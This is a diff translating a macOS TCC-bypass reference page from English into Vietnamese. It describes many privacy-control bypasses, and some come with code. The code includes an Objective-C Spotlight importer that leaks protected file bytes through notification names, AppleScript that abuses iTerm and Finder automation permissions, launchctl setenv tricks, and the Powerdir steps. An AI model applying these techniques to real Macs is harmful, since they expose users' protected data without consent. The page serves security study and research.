@@ -2,13 +2,13 @@
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
-For TCC grant storage and Automation sender/target attribution, see the [macOS TCC overview](../index.html#identify-apple-events-sender-and-target-grants).
+Để biết về nơi lưu trữ quyền cấp của TCC và cách quy kết sender/target cho Automation, xem [tổng quan về macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).
 
-## By functionality
+## Theo chức năng
 
 ### Write Bypass
 
-This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
+Đây không phải là một bypass, mà chỉ là cách TCC hoạt động: **TCC không bảo vệ khỏi thao tác ghi**. Nếu Terminal **không có quyền đọc Desktop của người dùng, nó vẫn có thể ghi vào đó**:
 
 ```shell-session
 username@hostname ~ % ls Desktop
@@ -20,22 +20,22 @@ username@hostname ~ % cat Desktop/lalala
 asd
 ```
 
-The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.<sup>[[2]](#references)</sup>
+Thuộc tính mở rộng **`com.apple.macl`** được thêm vào **file** mới để cấp quyền đọc file đó cho **ứng dụng tạo file**.<sup>[[2]](#references)</sup>
 
 ### TCC ClickJacking
 
-It's possible to **put a window over the TCC prompt** to make the user **accept** it without noticing. You can find a PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>
+Có thể **đặt một cửa sổ đè lên lời nhắc TCC** để khiến người dùng **chấp nhận** mà không nhận ra. Bạn có thể tìm PoC tại [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>
 
 <figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
 ### TCC Request by arbitrary name
 
-Attacker can **create apps with any name** (e.g. Finder, Google Chrome...) in the **`Info.plist`** and make it request access to some TCC protected location. The user will think that the legit application is the one requesting this access.\
-Moreover, it's possible to **remove the legit app from the Dock and put the fake one on it**, so when the user clicks on the fake one (which can use the same icon) it could call the legit one, ask for TCC permissions and execute a malware, making the user believe the legit app requested the access.<sup>[[2]](#references)</sup>
+Kẻ tấn công có thể **tạo ứng dụng với tên bất kỳ** (ví dụ: Finder, Google Chrome...) trong **`Info.plist`**, rồi yêu cầu quyền truy cập vào một vị trí được TCC bảo vệ. Người dùng sẽ tưởng ứng dụng hợp pháp đang yêu cầu quyền truy cập này.\
+Ngoài ra, có thể **xóa ứng dụng hợp pháp khỏi Dock rồi đặt ứng dụng giả mạo vào đó**. Khi người dùng nhấp vào ứng dụng giả mạo (có thể dùng cùng biểu tượng), ứng dụng này có thể gọi ứng dụng hợp pháp, yêu cầu quyền TCC rồi thực thi malware, khiến người dùng tin rằng ứng dụng hợp pháp đã yêu cầu quyền truy cập.<sup>[[2]](#references)</sup>
 
 <figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>
 
-More info and PoC in:
+Tìm thêm thông tin và PoC tại:
 
 
 {{#ref}}
@@ -44,38 +44,38 @@ More info and PoC in:
 
 ### SSH Bypass
 
-By default an access via **SSH used to have "Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):<sup>[[2]](#references)</sup>
+Theo mặc định, truy cập qua **SSH từng có quyền "Full Disk Access"**. Để vô hiệu hóa quyền này, cần giữ SSH trong danh sách nhưng tắt quyền đi (xóa SSH khỏi danh sách sẽ không xóa các đặc quyền đó):<sup>[[2]](#references)</sup>
 
-![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)
+![TCC Request by arbitrary name - SSH Bypass: Theo mặc định, truy cập qua SSH từng có quyền "Full Disk Access". Để vô hiệu hóa quyền này, cần giữ SSH trong danh sách nhưng tắt quyền đi (xóa SSH...](<../../../../../images/image (1077).png>)
 
-Here you can find examples of how some **malwares have been able to bypass this protection**:
+Tại đây có các ví dụ về **malware đã vượt qua được cơ chế bảo vệ này**:
 
 - [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>
 
 > [!CAUTION]
-> Note that now, in order to be able to enable SSH you need **Full Disk Access**
+> Lưu ý rằng hiện nay, để bật SSH, bạn cần cấp quyền **Full Disk Access**
 
 ### Handle extensions - CVE-2022-26767
 
-The attribute **`com.apple.macl`** is given to files to give a **certain application permissions to read it.** This attribute is set when **drag\&drop** a file over an app, or when a user **double-clicks** a file to open it with the **default application**.
+Thuộc tính **`com.apple.macl`** được gán cho file để cấp cho **một ứng dụng nhất định quyền đọc file đó.** Thuộc tính này được thiết lập khi **kéo-thả** file lên ứng dụng hoặc khi người dùng **nhấp đúp** vào file để mở bằng **ứng dụng mặc định**.
 
-Therefore, a user could **register a malicious app** to handle all the extensions and call Launch Services to **open** any file (so the malicious file will be granted access to read it).<sup>[[23]](#references)</sup>
+Do đó, người dùng có thể **đăng ký một ứng dụng độc hại** để xử lý mọi phần mở rộng file và gọi Launch Services để **mở** bất kỳ file nào (nhờ vậy ứng dụng độc hại được cấp quyền đọc file đó).<sup>[[23]](#references)</sup>
 
 ### iCloud
 
-The entitlement **`com.apple.private.icloud-account-access`** it's possible to communicate with **`com.apple.iCloudHelper`** XPC service which will **provide iCloud tokens**.
+Entitlement **`com.apple.private.icloud-account-access`** cho phép giao tiếp với dịch vụ XPC **`com.apple.iCloudHelper`**, dịch vụ này sẽ **cung cấp token iCloud**.
 
-**iMovie** and **Garageband** had this entitlement and others that allowed.
+**iMovie** và **Garageband** từng có entitlement này cùng các entitlement khác cho phép truy cập.
 
-For more **information** about the exploit to **get icloud tokens** from that entitlement check the talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>
+Để biết thêm **thông tin** về khai thác **lấy token iCloud** thông qua entitlement này, xem bài nói chuyện: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>
 
-### Spotlight importer leakage via Darwin notification names
+### Rò rỉ dữ liệu qua tên thông báo Darwin của Spotlight importer
 
-A Spotlight importer can read the file that Spotlight passes to its `GetMetadataForFile` callback, even when a normal process without Full Disk Access cannot read it. Unlike [code injection into a TCC-authorized process](../macos-tcc-credential-and-data-theft.md), this requires a local foothold able to install an importer and a matching Spotlight indexing event. The importer is sandboxed, but name-only Darwin notifications can carry bytes to a listener outside that sandbox. This is a data-leak channel, not a route to root or arbitrary file access from the importer.<sup>[[24]](#references)</sup>
+Spotlight importer có thể đọc file mà Spotlight chuyển cho callback `GetMetadataForFile`, ngay cả khi một tiến trình thông thường không có Full Disk Access không thể đọc file đó. Khác với [code injection vào tiến trình được TCC cấp quyền](../macos-tcc-credential-and-data-theft.md), cách này đòi hỏi phải có quyền truy cập ban đầu trên máy để cài đặt importer và chờ sự kiện lập chỉ mục Spotlight phù hợp. Importer bị sandbox giới hạn, nhưng thông báo Darwin chỉ có tên vẫn có thể mang byte đến listener bên ngoài sandbox. Đây là kênh rò rỉ dữ liệu, không phải cách để importer đạt quyền root hoặc truy cập file tùy ý.<sup>[[24]](#references)</sup>
 
-Declare the target file type under `CFBundleDocumentTypes` → `LSItemContentTypes` in the importer's `Info.plist`, then install the bundle in `~/Library/Spotlight/` or an app's `Contents/Library/Spotlight/`. Check registration with `mdimport -L`. The [Spotlight importer section](../../../../macos-auto-start-locations.md#spotlight-plugins) covers bundle placement and file-type matching. The importer only receives files for which Spotlight selects it; an existing importer generally takes precedence. On macOS 26 Tahoe, `mdimport -i` did not reliably force immediate recursive indexing in the reported tests, while `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` requested reimport of UTIs claimed by that importer.<sup>[[24]](#references)</sup>
+Khai báo loại file mục tiêu trong `CFBundleDocumentTypes` → `LSItemContentTypes` của `Info.plist` của importer, sau đó cài bundle vào `~/Library/Spotlight/` hoặc `Contents/Library/Spotlight/` của một ứng dụng. Kiểm tra đăng ký bằng `mdimport -L`. Phần [Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) giải thích vị trí đặt bundle và cách khớp loại file. Importer chỉ nhận những file mà Spotlight chọn nó để xử lý; importer hiện có thường được ưu tiên. Trên macOS 26 Tahoe, trong các thử nghiệm được báo cáo, `mdimport -i` không phải lúc nào cũng buộc lập chỉ mục đệ quy ngay lập tức, trong khi `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` yêu cầu lập chỉ mục lại các UTI mà importer đó khai báo hỗ trợ.<sup>[[24]](#references)</sup>
 
-For a channel test, start a listener outside the sandbox with `notifyutil -w TEST_TEST_TEST`, then post a notification with `CFNotificationCenterGetDarwinNotifyCenter()` and `NULL` object and `userInfo`. Unlike a distributed notification with a `userInfo` payload, the Darwin notification has only its name. For binary data, register the external listener for decimal names `0` through `255` using `notify_register_dispatch`; map each callback's registration to its byte value. Within `GetMetadataForFile`, read only the Spotlight-provided `pathToFile` and send each byte as a decimal notification name:<sup>[[24]](#references)</sup>
+Để kiểm tra kênh này, khởi chạy listener bên ngoài sandbox bằng `notifyutil -w TEST_TEST_TEST`, rồi gửi thông báo bằng `CFNotificationCenterGetDarwinNotifyCenter()` với đối tượng và `userInfo` là `NULL`. Khác với thông báo phân tán có payload `userInfo`, thông báo Darwin chỉ chứa tên. Để truyền dữ liệu nhị phân, đăng ký listener bên ngoài cho các tên dạng số thập phân từ `0` đến `255` bằng `notify_register_dispatch`; ánh xạ đăng ký của mỗi callback sang giá trị byte tương ứng. Trong `GetMetadataForFile`, chỉ đọc `pathToFile` do Spotlight cung cấp và gửi từng byte dưới dạng tên thông báo số thập phân:<sup>[[24]](#references)</sup>
 
 ```objectivec
 NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
@@ -89,26 +89,26 @@ for (NSUInteger i = 0; i < data.length; i++) {
 }
 ```
 
-The listener reconstructs the byte sequence rather than reading the TCC-protected file itself. The published PoC recovered the first 64 bytes of `knowledgeC.db` from a non-FDA terminal with SIP enabled on macOS 26. This is low-bandwidth and not a reliable bulk-copy method: Spotlight may not index or reindex a target file, and concurrent importer instances can interleave notification streams. See [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) for other sandbox-boundary mechanisms.<sup>[[24]](#references)</sup>
+Listener tái tạo chuỗi byte thay vì tự đọc tệp được TCC bảo vệ. PoC đã công bố khôi phục 64 byte đầu tiên của `knowledgeC.db` từ một terminal không có FDA, trên macOS 26 khi SIP được bật. Đây là phương thức có băng thông thấp và không đáng tin cậy để sao chép hàng loạt: Spotlight có thể không lập chỉ mục hoặc lập chỉ mục lại tệp mục tiêu, còn các phiên bản importer chạy đồng thời có thể làm xen kẽ các luồng thông báo. Xem [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) để biết các cơ chế khác vượt qua ranh giới sandbox.<sup>[[24]](#references)</sup>
 
 ### kTCCServiceAppleEvents / Automation
 
-An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.<sup>[[2]](#references)</sup>
+Một ứng dụng có quyền **`kTCCServiceAppleEvents`** sẽ có thể **điều khiển các ứng dụng khác**. Điều này có nghĩa là ứng dụng đó có thể **lạm dụng các quyền được cấp cho những ứng dụng khác**.<sup>[[2]](#references)</sup>
 
-For more info about Apple Scripts check:
+Để biết thêm thông tin về Apple Scripts, hãy xem:
 
 
 {{#ref}}
 macos-apple-scripts.md
 {{#endref}}
 
-For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
+Ví dụ: nếu một ứng dụng có **quyền Automation đối với `iTerm`**, như trong ví dụ này, **`Terminal`** có quyền truy cập vào iTerm:
 
 <figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>
 
-#### Over iTerm
+#### Đối với iTerm
 
-Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:
+Terminal, dù không có FDA, có thể gọi iTerm, ứng dụng có FDA, rồi dùng nó để thực hiện các hành động:
 
 ```applescript:iterm.script
 tell application "iTerm"
@@ -126,9 +126,9 @@ end tell
 osascript iterm.script
 ```
 
-#### Over Finder
+#### Thông qua Finder
 
-Or if an App has access over Finder, it could a script such as this one:
+Hoặc nếu một App có quyền truy cập thông qua Finder, nó có thể chạy một script như sau:
 
 ```applescript
 set a_user to do shell script "logname"
@@ -140,14 +140,14 @@ end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
 
-## By App behaviour
+## Theo hành vi ứng dụng
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+**tccd daemon** ở userland sử dụng biến **env** **`HOME`** để truy cập cơ sở dữ liệu TCC của người dùng tại: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.<sup>[[19]](#references)</sup>\
-Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.<sup>[[1]](#references)</sup>\
+Theo [bài đăng Stack Exchange này](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), vì TCC daemon chạy thông qua `launchd` trong domain của người dùng hiện tại, nên có thể **kiểm soát mọi biến môi trường** được truyền cho nó.<sup>[[19]](#references)</sup>\
+Do đó, **attacker có thể đặt biến môi trường `$HOME`** trong **`launchctl`** để trỏ đến một **thư mục** **do mình kiểm soát**, **khởi động lại** **TCC** daemon, rồi **sửa trực tiếp cơ sở dữ liệu TCC** để tự cấp cho mình **mọi quyền TCC hiện có** mà không cần hỏi người dùng cuối.<sup>[[1]](#references)</sup>\
 PoC:
 
 ```bash
@@ -179,77 +179,77 @@ $> ls ~/Documents
 
 ### CVE-2021-30761 - Notes
 
-Notes had access to TCC-protected locations, but a newly created note was **stored in a non-protected location**. Therefore, an attacker could ask Notes to copy a protected file into a note and then access the resulting data from the non-protected location:
+Notes có quyền truy cập vào các vị trí được TCC bảo vệ, nhưng ghi chú mới tạo lại được **lưu ở một vị trí không được bảo vệ**. Vì vậy, kẻ tấn công có thể yêu cầu Notes sao chép một tệp được bảo vệ vào ghi chú, rồi truy cập dữ liệu đã sao chép từ vị trí không được bảo vệ:
 
 <figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>
 
 ### CVE-2021-30782 - Translocation
 
-The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.
+Binary `/usr/libexec/lsd` cùng với thư viện `libsecurity_translocate` có entitlement `com.apple.private.nullfs_allow`, cho phép nó tạo mount **nullfs**, và entitlement `com.apple.private.tcc.allow` với **`kTCCServiceSystemPolicyAllFiles`** để truy cập mọi tệp.
 
-It was possible to add the quarantine attribute to "Library", call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`** where all the documents inside Library could be **accessed**.
+Có thể thêm thuộc tính quarantine vào "Library", gọi dịch vụ XPC **`com.apple.security.translocation`**, rồi dịch vụ này sẽ ánh xạ Library tới **`$TMPDIR/AppTranslocation/d/d/Library`**, nơi có thể **truy cập** tất cả tài liệu bên trong Library.
 
 ### CVE-2024-44131 - FileProvider symlink race
 
-Apps that hand file operations over to a **privileged helper** (here **`fileproviderd`** / `Files.app`) copy or move items **on behalf of the user**, so the copy runs with the helper's privileges instead of the caller's.
+Các ứng dụng chuyển giao thao tác với tệp cho một **privileged helper** (ở đây là **`fileproviderd`** / `Files.app`) sẽ sao chép hoặc di chuyển các mục **thay mặt người dùng**, nên thao tác sao chép chạy với quyền của helper thay vì của caller.
 
-Jamf Threat Labs showed that the symlink validation performed before the operation can be **raced**: instead of planting the symlink on the **last** path component (which is checked), the attacker swaps an **intermediate** directory of the path **after the copy has already started**. The privileged helper then follows the attacker-controlled link and reads/writes TCC-protected locations **without ever showing a prompt**.<sup>[[5]](#references)</sup>
+Jamf Threat Labs cho thấy có thể **race** bước kiểm tra symlink được thực hiện trước thao tác: thay vì đặt symlink ở thành phần đường dẫn **cuối cùng** (vốn được kiểm tra), kẻ tấn công thay thế một thư mục **trung gian** trong đường dẫn **sau khi thao tác sao chép đã bắt đầu**. Khi đó, privileged helper sẽ đi theo liên kết do kẻ tấn công kiểm soát và đọc/ghi vào các vị trí được TCC bảo vệ **mà không hiển thị prompt**.<sup>[[5]](#references)</sup>
 
-Directories that are **not** protected by a random UUID in their path (for example `~/Library/Mobile Documents/com~apple~CloudDocs`) are the easiest targets, because the attacker can predict the full path to race.
+Các thư mục **không** được bảo vệ bằng UUID ngẫu nhiên trong đường dẫn (ví dụ `~/Library/Mobile Documents/com~apple~CloudDocs`) là mục tiêu dễ khai thác nhất, vì kẻ tấn công có thể đoán trước toàn bộ đường dẫn để race.
 
 > [!TIP]
-> This is the generic pattern to look for: **any privileged process that resolves a path more than once** (check-then-use, or `rename()`/`copyfile()` resolving source and destination separately) can be raced by swapping a directory in the middle of the path. Only `O_NOFOLLOW_ANY`, `openat()` on an already-opened directory FD, or `realpath()` + re-validation actually close the window.
+> Đây là pattern tổng quát cần tìm: **bất kỳ process có đặc quyền nào phân giải một đường dẫn nhiều lần** (kiểm tra rồi sử dụng, hoặc `rename()`/`copyfile()` phân giải riêng source và destination) đều có thể bị race bằng cách thay thế một thư mục ở giữa đường dẫn. Chỉ `O_NOFOLLOW_ANY`, `openat()` trên một directory FD đã mở, hoặc `realpath()` + kiểm tra lại mới thực sự khép được khoảng thời gian này.
 
-More info in [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>
+Xem thêm trong [**bài viết của Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>
 
 ### SQLITE_SQLLOG_DIR
 
-`libsqlite3` can be built with `SQLITE_ENABLE_SQLLOG`, which adds a logging hook driven by environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>
+Có thể build `libsqlite3` với `SQLITE_ENABLE_SQLLOG`, tùy chọn này bổ sung một logging hook được điều khiển bằng environment variable ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>
 
-- **`SQLITE_SQLLOG_DIR=path`** – for **every database that is opened**, a **copy of the database file** and a log of the SQL statements are written into `path` (the directory must already exist).
-- **`SQLITE_SQLLOG_REUSE_FILES=0`** – take a **fresh copy every time** a DB is opened/attached instead of reusing one.
-- **`SQLITE_SQLLOG_CONDITIONAL`** – only log a connection if a `<database>-sqllog` file exists next to the main DB.
+- **`SQLITE_SQLLOG_DIR=path`** – với **mỗi database được mở**, một **bản sao của tệp database** và log các câu lệnh SQL sẽ được ghi vào `path` (thư mục này phải tồn tại từ trước).
+- **`SQLITE_SQLLOG_REUSE_FILES=0`** – tạo **bản sao mới mỗi lần** mở/gắn một DB thay vì dùng lại bản hiện có.
+- **`SQLITE_SQLLOG_CONDITIONAL`** – chỉ log một connection nếu có tệp `<database>-sqllog` bên cạnh DB chính.
 
-If you can inject this variable into a process that has **FDA** and opens SQLite databases, it will happily **copy those protected databases** into a directory you control. Because the destination filename is derived from attacker-controlled data, a **symlink planted at the destination** turns the same primitive into an **arbitrary file write** with the target process' privileges.
+Nếu có thể inject biến này vào một process có **FDA** và mở các database SQLite, process đó sẽ sẵn sàng **sao chép các database được bảo vệ** vào một thư mục do bạn kiểm soát. Vì tên tệp đích được tạo từ dữ liệu do kẻ tấn công kiểm soát, một **symlink được đặt sẵn ở đích** sẽ biến primitive này thành **arbitrary file write** với quyền của target process.
 
 ### **SQLITE_AUTO_TRACE**
 
-If the environment variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries. Many applications used this library, so it was possible to log all their SQLite queries.<sup>[[22]](#references)</sup>
+Nếu đặt environment variable **`SQLITE_AUTO_TRACE`**, thư viện **`libsqlite3.dylib`** sẽ bắt đầu **ghi log** tất cả truy vấn SQL. Nhiều ứng dụng sử dụng thư viện này, nên có thể ghi log tất cả truy vấn SQLite của chúng.<sup>[[22]](#references)</sup>
 
-Several Apple applications used this library to access TCC protected information.
+Một số ứng dụng của Apple sử dụng thư viện này để truy cập thông tin được TCC bảo vệ.
 
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
 
-### Hunting for env-var driven file writes
+### Tìm kiếm các thao tác ghi file được điều khiển bằng biến môi trường
 
-The two previous entries are instances of the same generic technique, and it is worth hunting for more: **frameworks loaded into TCC-privileged apps often expose debug/logging environment variables that make the process create a file at a caller-controlled path**.
+Hai mục trước là các ví dụ của cùng một kỹ thuật tổng quát, và đáng để tìm thêm: **các framework được tải vào ứng dụng có quyền TCC thường cung cấp các biến môi trường debug/logging khiến tiến trình tạo file tại đường dẫn do bên gọi kiểm soát**.
 
-Workflow to find them:
+Quy trình tìm kiếm:
 
-1. Pick a target with FDA or another juicy TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) and list the frameworks it links (`otool -L`, `vmmap`).
-2. Grep those frameworks for `getenv` strings: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
-3. Set candidate variables via `launchctl setenv NAME /path/you/control`, launch the app and watch what it does on the filesystem with `fs_usage -w -f filesys <pid>` or `sudo fs_usage | grep <path>`.
-4. If the process **creates or renames** a file in your directory, you have a write primitive: point the destination at a symlink (or race an intermediate directory, as in CVE-2024-44131 above) to redirect it onto `~/Library/Application Support/com.apple.TCC/TCC.db`.
+1. Chọn mục tiêu có FDA hoặc một quyền TCC giá trị khác (`Music`, `TV`, `Terminal`, agent MDM...) rồi liệt kê các framework mà nó liên kết (`otool -L`, `vmmap`).
+2. Tìm chuỗi `getenv` trong các framework đó: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
+3. Đặt các biến ứng viên bằng `launchctl setenv NAME /path/you/control`, khởi chạy ứng dụng và theo dõi hoạt động trên filesystem bằng `fs_usage -w -f filesys <pid>` hoặc `sudo fs_usage | grep <path>`.
+4. Nếu tiến trình **tạo hoặc đổi tên** một file trong thư mục của bạn, bạn đã có primitive ghi: trỏ đích đến một symlink (hoặc race một thư mục trung gian, như trong CVE-2024-44131 ở trên) để chuyển hướng thao tác ghi đến `~/Library/Application Support/com.apple.TCC/TCC.db`.
 
 > [!TIP]
-> Two things limit this. First, **`DYLD_*` variables are ignored for hardened-runtime binaries** unless the app ships the [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — see also [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Second, Apple removes individual framework debug variables as they get reported, so a variable that worked on one macOS release is often gone on the next. If an app silently refuses to launch after you set one, treat that variable as already filtered.<sup>[[7]](#references)[[8]](#references)</sup>
+> Có hai điều hạn chế kỹ thuật này. Thứ nhất, **các biến `DYLD_*` bị bỏ qua đối với binary hardened-runtime** trừ khi ứng dụng có entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("giá trị Boolean cho biết ứng dụng có thể bị ảnh hưởng bởi các biến môi trường của dynamic linker hay không; bạn có thể dùng chúng để inject code vào tiến trình của ứng dụng") — xem thêm [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Thứ hai, Apple gỡ từng biến debug của framework sau khi chúng được báo cáo, nên biến hoạt động trên một bản macOS thường sẽ bị loại bỏ ở bản kế tiếp. Nếu ứng dụng âm thầm từ chối khởi chạy sau khi bạn đặt một biến, hãy xem biến đó như đã bị lọc.<sup>[[7]](#references)[[8]](#references)</sup>
 
-Look at [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) for the equivalent trick with linker variables.
+Xem [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) để tìm hiểu thủ thuật tương tự với các biến linker.
 
 ### Apple Remote Desktop
 
-As root you could enable this service and the **ARD agent will have full disk access** which could then be abused by a user to make it copy a new **TCC user database**.
+Với quyền root, bạn có thể bật dịch vụ này; **ARD agent sẽ có full disk access**, sau đó người dùng có thể lạm dụng quyền này để khiến agent sao chép một **TCC user database** mới.
 
-## By **NFSHomeDirectory**
+## Bằng **NFSHomeDirectory**
 
-TCC uses a database in the user's HOME folder to control access to resources specific to the user at **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
-Therefore, if the user manages to restart TCC with a $HOME env variable pointing to a **different folder**, the user could create a new TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** and trick TCC to grant any TCC permission to any app.
+TCC dùng một database trong thư mục HOME của người dùng để kiểm soát quyền truy cập vào các tài nguyên riêng của người dùng tại **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
+Vì vậy, nếu người dùng khởi động lại được TCC với biến môi trường $HOME trỏ đến **một thư mục khác**, họ có thể tạo một TCC database mới tại **/Library/Application Support/com.apple.TCC/TCC.db** và lừa TCC cấp bất kỳ quyền TCC nào cho bất kỳ ứng dụng nào.
 
 > [!TIP]
-> Note that Apple uses the setting stored within the user's profile in the **`NFSHomeDirectory`** attribute for the **value of `$HOME`**, so if you compromise an application with permissions to modify this value (**`kTCCServiceSystemPolicySysAdminFiles`**), you can **weaponize** this option with a TCC bypass.
+> Lưu ý rằng Apple dùng giá trị được lưu trong hồ sơ người dùng, tại thuộc tính **`NFSHomeDirectory`**, làm **giá trị của `$HOME`**. Vì vậy, nếu bạn chiếm quyền được một ứng dụng có quyền sửa đổi giá trị này (**`kTCCServiceSystemPolicySysAdminFiles`**), bạn có thể **weaponize** tùy chọn này để bypass TCC.
 
 ### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>
 
@@ -257,45 +257,45 @@ Therefore, if the user manages to restart TCC with a $HOME env variable pointing
 
 ### CVE-2021-30970 - Powerdir
 
-The **first POC** uses [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) and [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) to modify the **HOME** folder of the user.
+**POC đầu tiên** dùng [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) và [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) để sửa đổi thư mục **HOME** của người dùng.
 
-1. Get a _csreq_ blob for the target app.
-2. Plant a fake _TCC.db_ file with required access and the _csreq_ blob.
-3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
-4. Modify the Directory Services entry to change the user’s home directory.
-5. Import the modified Directory Services entry with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
-6. Stop the user’s _tccd_ and reboot the process.
+1. Lấy blob _csreq_ của ứng dụng mục tiêu.
+2. Tạo một file _TCC.db_ giả có quyền truy cập cần thiết và blob _csreq_.
+3. Xuất mục Directory Services của người dùng bằng [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
+4. Sửa đổi mục Directory Services để đổi thư mục home của người dùng.
+5. Nhập mục Directory Services đã sửa đổi bằng [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
+6. Dừng _tccd_ của người dùng rồi khởi động lại tiến trình.
 
-The second POC used **`/usr/libexec/configd`** which had `com.apple.private.tcc.allow` with the value `kTCCServiceSystemPolicySysAdminFiles`.\
-It was possible to run **`configd`** with the **`-t`** option, an attacker could specify a **custom Bundle to load**. Therefore, the exploit **replaces** the **`dsexport`** and **`dsimport`** method of changing the user’s home directory with a **`configd` code injection**.
+POC thứ hai dùng **`/usr/libexec/configd`**, có `com.apple.private.tcc.allow` với giá trị `kTCCServiceSystemPolicySysAdminFiles`.\
